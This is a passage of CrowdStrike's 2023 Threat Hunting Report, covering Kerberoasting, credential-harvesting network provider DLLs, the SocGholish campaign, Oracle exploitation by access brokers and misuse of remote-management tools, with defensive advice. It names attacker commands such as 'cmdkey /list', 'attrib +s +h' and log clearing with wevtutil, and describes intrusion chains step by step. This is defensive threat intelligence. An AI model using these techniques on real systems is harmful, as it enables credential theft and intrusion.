Through the combination 
of technology, people and 
intelligence, we raised the 
cost for these adversaries 
— and continue to do so 
every day. 

Foreword

Nearly 12 years ago, a scrappy group of technologists and security professionals 
came together with a simple idea: building world\-class, cloud\-delivered endpoint 
protection that leverages machine learning and artificial intelligence to create a 
highly dynamic security solution that continues to learn and evolve as endpoints 
are added and leverages automation to scale. 

But the product was only part of the story. This technology would be 
continuously augmented by professional, efficient incident responders who 
could transform their front\-line insights into tangible data to feed it. The final part 
of the story is that all of this would be powered by intelligence, drawing on human 
expertise and ingenuity across a diverse range of disciplines to provide endpoint 
security that is, at its core, informed by today’s threat landscape. 

When we launched this idea under the CrowdStrike banner, we told the world 
they don’t have a malware problem, they have an adversary problem. Key to this 
message is stopping the breaches perpetrated by these adversaries. Through 
the combination of technology, people and intelligence, we raised the cost for 
these adversaries — and continue to do so every day. 

In the time since, CrowdStrike has continuously innovated. Our single\-agent 
technology has grown into the vulnerability management space and driven 
innovation across cloud workloads, control planes, containers and the Internet of 
Things. We fulfilled our promise to deliver government\-quality intelligence for the 
private sector and created an elite threat hunting team known as CrowdStrike® 
Falcon OverWatch™. As the CrowdStrike Intelligence and Falcon OverWatch 
teams evolved and grew, they increasingly collaborated on developing visibility 
from the CrowdStrike Falcon® platform into adversary insights, culminating in 
CrowdStrike tracking over 215 adversaries today.

The key to this collaboration is speed. When we talk about creating a security 
solution for the way the threat landscape looks today, we cannot ignore 
adversary speed. Over the past 12 months, the average breakout time for 
interactive eCrime intrusion activity was 79 minutes. Falcon OverWatch 
witnessed one adversary breakout time of just seven minutes. In less than 
the time it takes to step away from your desk and make a cup of coffee, this 
adversary had landed on an initial host and moved laterally into the broader 
victim environment.

The questions CISOs need to ask their teams are, “Have we gotten faster at 
identifying, investigating and remediating today’s threats? Can we detect an 
adversary in seven minutes or even seven hours?”

At CrowdStrike, we asked ourselves these questions. We came together to 
figure out how to get even faster at stopping breaches so our customers can go 
faster. We determined that closer alignment of threat hunting and intelligence 
would not only help us get faster but allow us to come back to the premise we 
started with: raising the cost to the adversary.

One potential intrusion 
approximately every 
seven minutes

1\.5 million additional 
malicious events directly 
prevented by the Falcon 
platform 

With the release of the CrowdStrike 2023 Threat Hunting Report, we are 
announcing the formation of a new defensive unit: CrowdStrike Counter 
Adversary Operations. Its mission is to use the collaborative power of hunting 
and intelligence to raise the cost of doing business for threat actors and give the 
adversary nowhere to hide. 

This report is the first of many publications that readers can expect from 
CrowdStrike’s newly formed Counter Adversary Operations team. This team 
formally unites Falcon OverWatch and CrowdStrike Intelligence under a single 
umbrella, deepening the already well\-established collaboration between these 
teams. 

This year’s report is the culmination of the past 12 months of proactive, 
intelligence\-informed threat hunting. In this 12\-month period, Falcon OverWatch 
threat hunters:

 ¼ Directly identified approximately one potential intrusion every seven 
minutes. Over the course of a year, this adds up to tens of thousands of 
instances where human\-driven hunting was instrumental in uncovering 
adversaries actively seeking to evade autonomous detection methods. 

 ¼ Distilled their findings into the development of hundreds of new 
behavioral\-based preventions. In practice, this means at least once 
per day on average, Falcon OverWatch threat hunters’ front\-line findings 
directly augment the Falcon platform’s ability to detect and prevent 
the latest threats. Over the course of the past year alone, these new 
behavioral\-based detections have enabled the Falcon platform to prevent 
an additional 1\.5 million malicious events that would have otherwise 
evaded autonomous detection methods.

These figures represent the Falcon OverWatch team’s around\-the\-clock 
efforts to disrupt the adversary. This work forces the adversary to change their 
approaches and directly raises their costs of operating.

Across all malicious activity tracked by CrowdStrike, 71% of intrusions were 
malware\-free. In a time when adversaries increasingly rely on hands\-on\-
keyboard tactics to achieve their objectives, threat hunting operations must be 
informed by today’s best threat intelligence. 

The new Counter Adversary Operations team will relentlessly track, detect and 
ultimately disrupt the adversary no matter when or where they operate.

Introduction

Identity threats emerged as the major theme of interactive — aka hands\-on\-keyboard — intrusions 
discovered by the CrowdStrike® Falcon OverWatch™ threat hunting team in the past 12 months. In all aspects 
of operations, adversaries looked for ways to broaden their reach, optimize their tradecraft and deepen their impact. 
These operations often started with an identity compromise. Adversaries are not relying solely on compromised 
valid credentials, either — rather, they demonstrated their capacity to abuse all forms of identification and 
authorization, including weak credentials purchased from the underground, and they elevated their phishing 
and social engineering tradecraft.

In addition to the broad targeting of identity, several trends stood out this year related to eCrime. First, the continued 
exploitation of vulnerable software to gain access, particularly in the case of access brokers,1 demonstrates the need 
for organizations to have visibility into their external attack surface. The expanded use of zero\-day vulnerabilities and 
the speed at which threat actors were able to develop N\-day exploits underscore the importance of vulnerability 
management and patching. Second, the rampant use of legitimate remote monitoring and management (RMM) 
tools illustrates adversaries’ attempts to blend into enterprise noise and avoid detection. SCATTERED SPIDER, for 
example, utilizes numerous RMM tools, enabling them to avoid detection for protracted periods of time to access 
sensitive data and — more recently — deploy ransomware. Finally, Falcon OverWatch observed adversaries such 
as INDRIK SPIDER following their otherwise opportunistic initial access attempts with more tailored follow\-on 
behaviors.

Consistent with the expectations outlined in last year’s report, Falcon OverWatch observed adversaries’ 
increased proficiency in attacks against cloud environments. In the past few months, adversaries have continued 
to demonstrate that they are adept at navigating all major cloud platforms. In particular, adversaries have been quick 
to learn how to take advantage of common misconfigurations or abuse the built\-in cloud management tooling. 
The concerning reality is that some adversaries appear to have a better handle on victims’ cloud environments 
than the organizations themselves.

Finally, cross\-platform proficiency is a hallmark of this year’s interactive intrusions. Exemplified by the 3CX 
supply chain attack perpetrated by LABYRINTH CHOLLIMA — and uncovered by CrowdStrike — many of today’s 
adversaries are able to confidently navigate multiple operating systems. Whether the adversary is leveraging native 
applications or cross\-platform development tools, the need to be flexible and adapt to any target environment is 
paramount to continued operational success.

Reader Note:

This report is based on insights from the Falcon OverWatch threat hunting team from July 1, 2022, 
through June 30, 2023\.2 The findings relate specifically to interactive intrusion activity — that is, activity 
where a threat actor was operating with hands\-on\-keyboard in a victim environment. Targeted adversaries 
refer to state\-nexus adversaries.

Front\-Line Snapshot

In the reporting period from July 1, 2022, through June 30, 2023, Falcon OverWatch observed interactive intrusion 
volumes continue to climb, with a total year\-over\-year increase of 40%. The overall distribution of interactive intrusion 
activity by threat type remained relatively constant this year compared to previous years, with a small decrease in the 
proportion of targeted intrusion activity.

Figure 3\. Top five targeted verticals separated by 
adversary threat type, July 2022 to June 2023

In the past year, the volume of interactive intrusion activity against the financial services industry increased by 
over 80%. Defenders in the financial industry should watch this trend closely, as the increased volume of activity 
is matched by an increased diversity of threats. This year, Falcon OverWatch uncovered activity in the financial 
industry spanning all adversary motivation types and targeting all three major operating systems as well as cloud 
infrastructure. 

North Korean adversaries are the most aggressive state\-sponsored adversaries to target the financial sector. They 
continue to engage in prolific, financially motivated operations primarily targeting financial and financial technology 
(fintech) organizations. eCrime threat actors also routinely target the financial sector. Though some adversaries 
focus on stealing cryptocurrency or non\-fungible tokens (NFTs), opportunistic big game hunting (BGH) ransomware 
and data theft campaigns remain the primary eCrime threat to financial institutions. Due to the victim organization's 
need to maintain system uptime and the sensitive nature of the sector, eCrime threat actors likely conclude that 
financial institutions are willing and able to pay ransom demands.

Figure 4\. Intrusion activity by threat actor heat map, July 2022 to June 2023

Please note the following about the data presented in this heat map:

 ¼ The heat mapping represents the number of distinct adversaries active within a particular vertical

 ¼ The heat mapping does not represent the total number of intrusion attempts within a vertical, as multiple 

intrusions by the same adversary group are represented only once

 ¼ Attribution to a high degree of confidence is not always possible. This table does not reflect any unattributed 

activity that occurred in any industry verticals

Targeted intrusion activity during this period notably correlated with the respective intelligence collection 
requirements and other priorities of each adversary grouping. The most straightforward of these is North Korean 
adversaries’ targeting of financial sector entities — as well as finance\-related consulting services — as part of a 
widespread currency generation effort meant to leverage cryptocurrency theft and, to a lesser extent, ransomware. 
The diversity of sectors targeted by Iranian (KITTEN) and Chinese (PANDA) state\-nexus adversaries are reflective 
of two distinct, but similar, tradecraft strategies. KITTEN adversaries increasingly rely on opportunistic exploitation 
of entities of interest, and PANDA adversaries continue to expand operations to achieve coverage across as many 
targets as possible.

The technology sector continues to be a high\-value target for eCrime adversaries, with BGH operations posing 
the most prevalent eCrime threat to the sector. The technology sector’s reliance on and access to highly sensitive 
data make it an especially attractive target for BGH operators. BGH operations continue to rely on ransomware and 
data theft. Other prominent eCrime threats to the technology sector include enabling services, access brokers and 
information theft campaigns.

Figure 5\. MITRE ATT\&CK heat map highlighting the top five techniques Falcon OverWatch observed 
adversaries use in each tactic area, June 2022 to July 2023

Falcon OverWatch tracks interactive intrusion activity against the MITRE ATT\&CK® Enterprise Matrix, a framework that 
categorizes and tracks adversary behavior.3

This heat map illustrates the top five techniques observed across the interactive intrusion activity discovered by Falcon 
OverWatch in each tactic area during the past year. The technique prevalence underscores a notable shift toward 
exploitation of identity across all stages of adversarial operations. This shift mirrors the evolution of organizations 
adapting to an increasingly disparate workforce, highlighting the morphing nature of the modern perimeter. 

No longer defined by a rigid outer shell, organizations today rely on identity as the pivotal control point. The consistent 
appearance of valid accounts across various tactics highlights the intensification of adversaries' strategic use of trusted 
accounts to gain initial access, establish persistence, elevate privileges and evade defenses. The concerning ease with 
which adversaries can gain initial access — often simply through purchases — blurs the distinction between legitimate 
users and imposters. Identifying such stealthy intruders necessitates proactive, identity\-based threat hunting combined 
with a robust understanding of an organization's unique operational landscape.

For full details of the techniques and sub\-techniques observed by Falcon OverWatch, see the Falcon OverWatch 2023 
MITRE ATT\&CK heat map.

Observations
Adversaries Advance the 
Frontier of Identity Threats

Today, 80% of breaches use compromised identities.4 The abuse of identity, 
particularly when coupled with creative defense evasion methodologies, enables 
adversaries to hide in plain sight. Despite identity being widely recognized as a 
growing security threat, the full spectrum of identity threats is not always well 
understood.

Reader Note:

Identity data refers to any information that uniquely identifies an individual 
or entity (such as data associated with accounts) and authentication and 
access controls (such as credentials, permissions, security tokens or digital 
certificates). This scope may extend to additional factors of authentication 
or data that can be used for the purposes of identity verification. A full list 
can be seen on page 16\. 

To ensure environments remain protected, hunters must work with the broadest 
possible definition of identity, as these types of data are prime targets for 
adversaries looking to maintain access, enable lateral movement and steal 
information. 

Taking a closer look at the specific techniques involved in identity threats reveals 
an interesting duality between new and old. Falcon OverWatch recently discovered 
and documented the abuse of network provider dynamic link libraries (DLLs) as a 
means to harvest valid credentials. A network provider DLL enables the Windows 
operating system to communicate with other types of networks by providing 
support for different networking protocols. This newly documented sub\-technique5 
sees adversaries operate without the need to touch the Local Security Authority 
Subsystem Service (LSASS) or dump the system Security Account Manager (SAM) 
hive, both of which are often highly monitored by security tools. This sub\-technique 
provides an evasive way to access valid account details. In contrast, threat hunters 
also tracked a surge in an old and well\-understood technique — Kerberoasting — 
with the resurgence likely due to continued effectiveness.

Service Principal 
Name (SPN)

An SPN is a unique identifier for services 

running on servers in Active Directory. It is 

especially important when using Kerberos 

authentication. An SPN allows a service 

to be mapped to a specific server, which 

helps a client find that service within the 

network. It also lets clients request service 

authentication, even without knowing the 

account name. Adversaries can misuse this 

feature by scanning for SPNs associated 

with high\-privilege accounts. They can 

perform attacks like Kerberoasting to 

crack passwords and potentially gain 

unauthorized access to resources.

DON’T GET BURNED BY KERBEROASTING

Over the past year, Falcon OverWatch observed a staggering 583% increase 
in Kerberoasting attacks6 to escalate privileges and enable lateral movement 
within a victim’s environment (see Figure 6\). Windows devices use the Kerberos 
authentication protocol, which grants tickets to provide users access based on 
service principal names (SPNs). Kerberoasting specifically involves the theft of 
tickets associated with SPNs. These tickets contain encrypted credentials that can 
be cracked offline using brute\-force methods to uncover the plaintext credentials.

Kerberoasting is a beneficial technique for adversaries because it targets an 
SPN associated with an Active Directory account, and because these SPNs are 
often tied to service accounts, they will usually have higher privileges and allow 
the adversary to extend their reach and gain access to sensitive files or systems. 
Additionally, these attacks can be challenging to detect because Kerberos activity is 
so prevalent in everyday telemetry, which allows adversaries to blend into the noise. 

Despite being well documented, this technique poses a significant threat to 
organizations because adversaries do not need elevated privileges to execute this 
attack. In the past year, attacks against Kerberos were associated predominantly 
with eCrime adversaries. VICE SPIDER was the most prolific eCrime adversary, 
responsible for 27% of all intrusions that involved the Kerberoasting technique.

Of the interactive intrusions that involved the use of Kerberoasting, Falcon 
OverWatch identified a range of initial access vectors, including password spraying, 
accessing existing remote services through valid accounts, and exploiting 
vulnerable web servers though web application attacks. It is not unusual for Falcon 
OverWatch to observe Kerberoasting being used to facilitate lateral movement from 
a host without appropriate endpoint security coverage.

Kerberoasting in Action

In an intrusion by VICE SPIDER, Falcon OverWatch discovered hands\-on\-keyboard activity against a victim 
organization in the academic sector. The compromise was associated with multiple hosts across virtual desktop 
infrastructure (VDI). The threat actor performed basic host reconnaissance to enumerate domain trusts using nltest, 
then enumerated administrator permissions groups and performed connectivity tests to outbound infrastructure. 

Next, the threat actor attempted to exploit the ZeroLogon vulnerability in an attempt to escalate privileges and then 
tested connectivity to a command\-and\-control (C2\) server using ping. The threat actor then executed SystemBC 
and SocksProxyGo through PowerShell to proxy connections to their C2 infrastructure. The adversary was clearly 
mindful of being detected and took several steps to cover their tracks, including setting their proxy connection to 
operate over non\-standard ports, creating a new firewall rule masquerading as a Windows update, and clearing the 
Security, Application and System logs using wevtutil. Further, they removed the registry entry for RunMRU and 
TypedPaths — two locations that would shed light on their interactive activity on the system.

After this, the adversary executed a script to perform a Kerberoasting attack and enumerate SPNs. VICE SPIDER’s 
likely goal was to capture these SPNs to identify Windows service accounts and extract the password hashes. This 
was confirmed when Falcon OverWatch found the adversary using the Hashcat tool in an attempt to brute\-force the 
password hashes.

Defensive Countermeasures

Falcon OverWatch increasingly sees adversaries using Kerberoasting to gain a 
greater foothold within Windows environments and escalate privileges. Defenders 
should investigate for signs of this activity to help identify protocol weaknesses and 
weak or compromised accounts, and find opportunities to improve detections.

The following recommendations will allow hunters to identify or mitigate this type of 
attack within their environment:

Interrogate Windows Event logs.

Both Security Event ID 4769 (Kerberos Service Ticket Request) and Event ID 4771 
(Kerberos Pre\-Authentication Failure) can indicate that Kerberoasting is taking 
place, especially when seen in large volumes over a short time period. Security 
Event ID 4769 should be filtered to look for Ticket Encryption Type 0x17 and 0x18, 
which indicate a weak RC4 cipher has been used that is prone to being cracked.

Filter for Kerberos network traffic that has 
RC4 encryption.

Adversaries usually opt to exploit RC4 because it is insecure. RC4 replies can be 
indicative of an adversary attempting to request service tickets using this type of 
encryption. Defenders should disable RC4 where possible, as it is vulnerable to 
attack — and where possible, AES Kerberos encryption should be enabled.

Audit activity for accounts that are likely targets 
for Kerberoasting.

This can be done by reviewing the Active Directory settings to see which service 
accounts have SPNs registered to them.

Ensure service account passwords are complex.

This will make them more resistant to password cracking attempts. Ensuring unique 
passwords are used for each service account will prevent one compromise from 
affecting multiple accounts.

Take offensive action.

Consider implementing a honey token approach to detect the use of service 
accounts with SPNs that have been deployed with weak passwords.

BEYOND USERNAMES AND PASSWORDS

When discussing identity threats, it is important to distinguish different ways an entity can be identified and 
authenticated to a system. Though the majority of interactive intrusions observed by Falcon OverWatch involve 
abuse of valid accounts7 — which in most instances presents as username and password combinations — intrusions 
often leverage other factors of authentication and identifying material. Some of the most common methods of 
identification and authentication are shown in Figure 7\.

Username and password or PIN

Authentication using a username and 
password or PIN

Smart card and PIN

Authentication using a physical item 
paired with a PIN

Valid account and Active 
Directory certiﬁcates

Authentication of computer or users using public 
key infrastructure

APIs and secret keys

Authentication of application programming 
interfaces (APIs)

Session\-based authentication, 
cookie\-based authentication and 
JSON Web Tokens (JWT)

Authentication to an application or system using 
an already created valid session or access token

Kerberos and Kerberos tickets

Authentication via tickets granted from a key 
distribution center (KDC), which are usually 
granted from use of a username and password

Biometrics such as facial 
recognition, voice recognition, 
ﬁngerprint recognition

Authentication through use of biometrics such as 
ﬁngerprint, face or voice, which compares these 
features to a saved template per user

Identity providers and protocols 
such as SAML and OAuth

Hardware and software tokens or 
time\-based one\-time password 
(TOTP)

Authentication of one or more identity providers 
through a service such as federation single sign\-on 
(SSO)

Authentication that requires a second element, 
e.g., a time\-based one\-time password, physical 
item or application

 Figure 7\. Commonly observed methods of identification and authentication

Some less traditional means of identity abuse include the following:

 ¼ Attempts to gather secret keys and other credential materials via cloud instance metadata APIs, which rose by 

160% year over year

 ¼ Exploitation of weaknesses in Kerberos security to steal or forge authentication material, which rose by 410% 

year over year (the specific sub\-technique of Kerberoasting rose by 583% year over year)

 ¼ Pass\-the\-Hash attacks, which rose by 200% year over year

 ¼ Abuse of Active Directory Certificate Services (AD CS), which was seen in the 2023 reporting period but not 

the 2022 reporting period

This targeting of identity and authentication material showcases that valid accounts are highly prized by adversaries. 
Over the past year, 62% of all interactive intrusions used valid accounts. Adversaries do not stop there — 26% of all 
intrusions involved attempts to dump credentials,8 and 11% involved attempts to target unsecured credentials.9 All 
of this can facilitate access to sensitive data or support privilege escalation or lateral movement. Falcon OverWatch 
also observed adversaries targeting credentials in password stores,10 capturing user input11 and modifying the 
authentication process12 itself.

Threat actors are also seeking new and novel tactics in operations aimed at gaining credentials for cloud 
environments. In November 2022, a victim organization in a CrowdStrike Services case accidentally published its 
cloud service provider root account’s access key credentials to GitHub. Within seconds, automated scanners and 
multiple threat actors attempted to use the compromised credentials. The speed with which this abuse was initiated 
suggests that multiple threat actors — in efforts to target cloud environments — maintain automated tooling to 
monitor services such as GitHub for leaked cloud credentials.

Defenders may wonder how else adversaries are obtaining these valid login details. Interestingly, only 14% of 
intrusions where valid accounts were used also involved a brute\-force13 attack. Of the remaining 86% of intrusions 
involving a valid account, over half originated from a system external to the organization. This suggests these 
accounts were likely obtained through credential harvesting, password reuse, phishing, an insider threat, or session 
hijacking, or they were purchased from an initial access broker. 

Defensive Countermeasures

Audit your user accounts.

A key step for defenders in identifying identity\-based risks in their organization is auditing the vast array of different 
user accounts that may be available to an adversary and ensuring that these implement the principle of least privilege 
and role\-based access control.

Leverage the right tools and processes to secure your identities.

When it comes to stopping identity threats in their tracks, two key tools at an organization’s disposal are 
implementing a Zero Trust14 model and implementing proactive and continuous hunting across identity for 
anomalous user behavior.

SPOTLIGHT: FALCON OVERWATCH IDENTIFIES 
MISSING MITRE IDENTITY TECHNIQUE

Falcon OverWatch analyzes and records its interactive intrusion data using MITRE 
ATT\&CK as an organizing framework. In the process of examining intrusion activity, 
analysts occasionally discover new techniques and sub\-techniques not accounted 
for by the framework. Falcon OverWatch recently recommended to MITRE the 
creation of a new sub\-technique called “Network Provider DLL” under the technique 
“Modify Authentication Process.” The new sub\-technique was accepted and 
included in ATT\&CK v13 under ID T1556\.008\.15

A network provider DLL enables the Windows operating system to communicate 
with other types of networks by providing support for different networking 
protocols. Because some protocols may involve authentication, a network provider 
DLL can also function as a credential manager. When serving as a credential 
manager, whenever a login or password change has occurred, registered network 
provider DLLs are notified and the username and password involved are sent as 
part of this notification.

Over the past year, Falcon OverWatch observed malicious network provider DLLs 
being abused to harvest usernames and passwords by writing these to disk for 
exfiltration. In multiple intrusions where Modify Authentication Process: Network 
Provider DLL was leveraged, an adversary was observed conducting intrusions 
against Microsoft Exchange servers. This specific activity has been observed 
since at least March 2022, with increasing operational tempo into late 2022\. 
This coincides with proof\-of\-concept code that was publicly released for two 
vulnerabilities: CVE\-2022\-41040 and CVE\-2022\-41082 (collectively, these are 
commonly referred to as ProxyNotShell). 

The unidentified adversary attempted to deploy a malicious network provider DLL 
onto Exchange systems designed to harvest credentials. This malicious network 
provider DLL masqueraded as the LSASS using the name lsass.dll – the entire 
process is detailed in Figure 8\. What makes these intrusions notable is that if 
successfully deployed on an Exchange server, the malicious DLL can be leveraged 
to access a large number of usernames, emails and passwords without the need 
to touch LSASS or dump the system SAM hive, both of which are often highly 
monitored by security tools. This sub\-technique does not need to be deployed to 
an Exchange server, and credentials can still be harvested using this technique on 
other Windows systems such as user workstations.

Left of Theft: Themes of 
Early\-Stage eCrime

In recent years, eCrime tradecraft has been one of the most dynamic aspects 
of the threat landscape. Adversaries in the eCrime ecosystem are making 
advances in their speed, efficacy and organization, resulting in tangible 
differences in the scale and sophistication of activity we defenders face.

The most notable change in the past year was the increase in instances of data 
theft and extortion without the use of ransomware — a trend the CrowdStrike 
2023 Global Threat Report revealed grew by 20% year over year in 2022\. This 
development is the latest demonstration of the business acumen of today’s 
eCrime adversaries and their ability to continually optimize their operations. 

Although the impact of eCrime operations is often what grabs headlines, what 
happens before extortion is what matters most when it comes to proactive 
defense. Falcon OverWatch examines threat activity from a distinctly defensive 
vantage point. Rather than focusing retrospectively on the impact of intrusions, 
threat hunters focus on the patterns of activity that provide the earliest possible 
signal of intrusion. Looking back over the past year, Falcon OverWatch hunters 
uncovered both unexpected and expected trends emerging across interactive 
eCrime intrusions.

One development observed by Falcon OverWatch this year is a shift in follow\-on 
behaviors from INDRIK SPIDER. Falcon OverWatch saw several instances of 
otherwise opportunistic initial access activity evolve into more tailored follow\-on 
attack patterns once the threat actor identified that they had caught a lucrative 
victim in their widely cast net.

This year’s anticipated trends involve the abuse of tried\-and\-true methods to 
access and navigate victim environments. These methods include exploitation of 
vulnerabilities and the use of RMM tools.

INDRIK SPIDER BRINGS THE TAILORED 
EXPERIENCE TO OPPORTUNISTIC ECRIME

This year, Falcon OverWatch observed numerous intrusions in which adversaries 
appeared to cast a wide net across multiple regions and verticals for initial access, 
then tailored their follow\-on tactics, techniques and procedures (TTPs) upon 
discovering they hit a high\-value target. 

Over the past year, INDRIK SPIDER was at the forefront of this trend, tailoring 
their operations based on characteristics of the compromised host and the victim 
organization. In multiple intrusions, INDRIK SPIDER took a multi\-phased approach, 
beginning with the use of the SocGholish tool to opportunistically find victims. 
This was followed by the use of a malicious JavaScript file that runs discovery 
commands — in particular, these commands look to see whether the victim host is 
domain\-joined. Upon discovering domain\-joined hosts, INDRIK SPIDER transitioned 
from scripted to interactive activity. In further evidence that the interactive follow\-on 
activity was tailored to the victim organization, Falcon OverWatch discovered that 
the malicious DLLs deployed to the target victims were environmentally keyed with 
each targeted organization’s domain name. 

Phase One: Cast a Wide Net with SocGholish

In this ongoing campaign, users who visit a compromised or malicious website with 
the SocGholish script are served a malicious pop\-up, and social engineering and 
masquerading techniques are used to trick the user into downloading, extracting 
and executing a JavaScript file known as a Fake Browser Update (FBU). Examples 
of these FBUs include Update.js, Chrome.Update.xxxxxx.js and Edge.js.

Upon execution,18 the FBU conducts multiple scripted19 discovery activities before 
relaying the data over C2 infrastructure and evaluating the response it receives. 

The FBU script delivered by SocGholish retrieves information via various 
discovery20 techniques and exfiltrates21 this data so that follow\-on activity can be 
executed depending on the response.

What Is 
Environmental 
Keying?

Environmental keying prevents malicious 

binaries from executing their intended 

payload unless they are executing within a 

target environment. This is commonly used 

in targeted intrusions to hinder attempts to 

reverse engineer, sandbox or detect with 

antivirus (AV) products and hide the tactics 

and techniques leveraged by the malicious 

binary.

One method of environmental keying noted 

during INDRIK SPIDER\-related intrusions 

is the use of BlisterLoader, which checks 

for a system’s Active Directory domain 

name upon executing and immediately 

terminates if the hash does not match a 

hardcoded value.

Phase Two: Identify Victims of Interest 

The follow\-on behavior appeared to be determined by whether or not the affected 
host was domain\-joined — information that was gathered during the initial stages of 
the intrusion. In some instances, Falcon OverWatch observed a NetSupport RAT 
payload being deployed for remote administration. In other cases, compromised 
hosts received a DLL containing a BlisterLoader\-packed Cobalt Strike implant. 

When NetSupport RAT installation occurred, it was installed almost instantly. This 
indicates the adversary used a set of predefined conditions to determine whether 
to deploy NetSupport RAT. To deploy NetSupport RAT, execution of a PowerShell 
download cradle occurs to retrieve and execute a script masquerading as an 
SVG image file. The masqueraded script downloads the RAT, sets persistence via 
the registry run key22 for the current user and executes the RAT using Windows 
Management Instrumentation (WMI). 

Phase Three: Go Hands\-On

In the SocGholish\-based intrusions that leveraged a BlisterLoader\-packed Cobalt 
Strike implant, Falcon OverWatch observed a distinct delay between initial access 
and automated discovery actions, and observed follow\-on activity. This delay is 
likely due to the transition from automated malicious activity to hands\-on\-keyboard 
activity. Falcon OverWatch found that the packed DLLs were environmentally 
keyed23 with each targeted organization’s domain name, leading Falcon OverWatch 
to conclude this activity was tailored to the victim. The environmental keying allowed 
the resulting payload to be unpacked and executed only in the correct environment. 

Written DLLs containing the packed Cobalt Strike implant were also named after 
the compromised organization in which they were executed or were otherwise 
found to be masquerading under the name of a third\-party security company in 
instances where persistence was established.

During this phase of the intrusions, the threat actor also conducted further 
discovery activity — including enumerating domain trusts24 and domain controllers 
and attempting credential access using the cmdkey /list command. Further 
commands and scripts were also run that directed their output to temporary files 
for later exfiltration. 

CrowdStrike Intelligence subsequently attributed this BlisterLoader\-packed Cobalt 
Strike implant to INDRIK SPIDER. Other activity observed during INDRIK SPIDER 
SocGholish\-based intrusions included credential access using SharpChromium, 
Kerberoasting using Rubeus and SharpRoast, and attempts to block event tracing 
for Windows to evade defenses.

ACCESS BROKERS ABUSE VULNERABILITIES 
FOR INITIAL ACCESS

Exploitation of public\-facing applications is another common theme across both eCrime 
and targeted intrusion activity this year, observed in over 20% of all interactive intrusions.25 
Vulnerabilities in various productivity applications are at the center of this activity. In many 
cases, vulnerabilities were patched at the time of exploitation, but those patches had not 
been applied to the affected services.

Productivity applications often sit on the edge of an organization’s infrastructure and can 
be missed when security controls are enforced across the rest of the environment. Without 
an external attack surface management (EASM) solution,26 defenders can easily lose track 
of just how many applications and services are exposed externally — increasing the risk of 
exposure to a vulnerability or chain of vulnerabilities. Given the scale at which vulnerabilities 
are disclosed, it is unsurprising that many organizations struggle to keep up with timely 
remediation. For this reason, defenders need to look beyond the Common Vulnerabilities 
and Exposures (CVEs) and ensure post\-exploitation activity can be quickly identified and 
effectively controlled. The ability to readily identify malicious follow\-on activity within an 
environment is also an effective control against unpatched or undisclosed vulnerabilities.

Since early 2023, a series of compromises involving Oracle WebLogic Server (WLS) were 
associated with Java Network Discovery Interface (JNDI) injection via CVE\-2023\-21839\. 
This activity aligned with either opportunistic eCrime activity using a publicly available exploit 
or an independently developed exploit variant associated with suspected China\-nexus 
targeted intrusion activity. This variant was observed in historic WLS activity targeting a 
different vulnerable Java object than those publicly known. Based on these observations, 
CrowdStrike Intelligence assesses that a variation of CVE\-2023\-21839 WLS instances has 
been repeatedly exploited in the wild since late February 2023\.

Figure 9\. JNDI injection to achieve remote code execution (RCE) via CVE\-2023\-21839

Another Oracle exploit — abusing an arbitrary file overwrite vulnerability impacting E\-Business Suite (CVE\-2022\-
21587\) — was also repeatedly observed during early 2023\. This included suspected CVE\-2023\-21839 exploitation 
by the notorious access broker PROPHET SPIDER, the most prolific eCrime adversary exploiting public\-facing web 
applications this past year.27

Access brokers share some operational commonalities with state\-nexus threat actors: gaining initial access to an 
organization through exploitation, attempting to remain hidden from traditional detection systems and establishing 
persistent access to an organization until follow\-on activity occurs. 

Access brokers sell their established access to a variety of clientele. This has a dual impact on the eCrime 
ecosystem. First, it lowers the barrier to entry for individuals looking to conduct criminal operations. Second, it 
allows for established adversaries to focus their efforts on honing their post\-exploitation tradecraft to achieve their 
malicious objectives more efficiently.

In the past year, there has been a 147% increase in access broker advertisements in criminal or underground 
communities. This stark increase in supply of compromised credentials is likely indicative of growing demand from 
adversaries looking to buy these credentials for follow\-on activity.

Defensive Countermeasures

Prioritize identity protection.

With identity becoming the new perimeter that adversaries exploit, defenders must 
adapt their security measures accordingly to stay ahead of threats and counteract 
tactics for gaining initial access.

Stay on top of patching and updates.

Ensure that all systems, software and applications are up\-to\-date with the latest 
patches. “Low\-hanging fruit” vulnerabilities are a common entry point for initial 
access brokers.

Hunt for follow\-on behaviors.

While the vulnerability landscape changes daily, the post\-exploitation actions an 
adversary takes in achieving their objectives are much less dynamic. Continuous 
hunting for known patterns of adversary behavior — such as logging in from 
new locations, accessing resources outside of normal operating hours and 
access\-denied events — is an effective way to identify the abuse of both known and 
unknown vulnerabilities.

Implement multifactor authentication (MFA) wherever possible.

MFA provides an added layer of security that can prevent account compromise, 
even in the event of credential compromise.

Leverage up\-to\-date threat intelligence.

Stay informed about the latest adversarial tradecraft as it relates to initial access 
brokers to better understand their TTPs.

REMOTE MONITORING AND MANAGEMENT TOOLS

RMM tools allow information technology (IT) administrators 
to remotely support workstation and server endpoints. 
However, these packages are commonly abused by 
adversaries seeking to gain and maintain a C2 channel into 
a victim’s environment. 

This past year, Falcon OverWatch observed RMM tools 
used in approximately 14% of all intrusions, and the volume 
of intrusions where RMM tools were leveraged by threat 
actors increased by 312% year over year. Figure 10 
highlights the top 10 RMM tools abused by threat actors 
and the relative change in their use from last year’s reporting 
period to this year’s.

The top tool used this past year by a large margin was 
AnyDesk. In intrusions where AnyDesk was observed, 
eCrime activity comprised 73% of the intrusions, targeted 
activity comprised 4% of intrusions and unattributed activity 
made up the remaining 23%. ScreenConnect and Atera 
Agent were also routinely used by eCrime threat actors. 

Falcon OverWatch frequently observed multiple RMM 
tools in individual intrusions perpetrated by eCrime actors, 
indicating eCrime actors are inclined to quickly swap tools 
to achieve their desired outcomes. The threat actors benefit 
from ease of use and lack of required effort compared to 
developing their own custom tools.

Observed Threat Actor Behaviors

RMM tools typically enter an environment through common command\-line 
ingress methods including curl, wget and PowerShell, and in the case of an 
adversary\-controlled RDP session, via standard web browsers or RDP clipboard 
redirection. Once in the environment, threat actors often attempt to conceal the 
presence of their tool. In one example, DISTANT SPIDER was observed installing 
ScreenConnect as a service on a Windows endpoint and masquerading the service 
name to appear as a Microsoft service. Falcon OverWatch also observed threat 
actors designating RMM tools and other client binaries as hidden system files using 
the attrib \+s \+h command to change the file attributes and ultimately attempt to 
conceal the file from view.

Notable Tool: RustDesk

RustDesk is an RMM tool written in the Rust programming language with typical 
RMM functionality. Since 2022, Falcon OverWatch has observed SCATTERED 
SPIDER and ALPHA SPIDER, alongside other eCrime and nation\-state adversaries, 
using RustDesk in their interactive intrusions. RustDesk is an open\-source 
package.28 Source code, as well as pre\-compiled binaries, are readily available for 
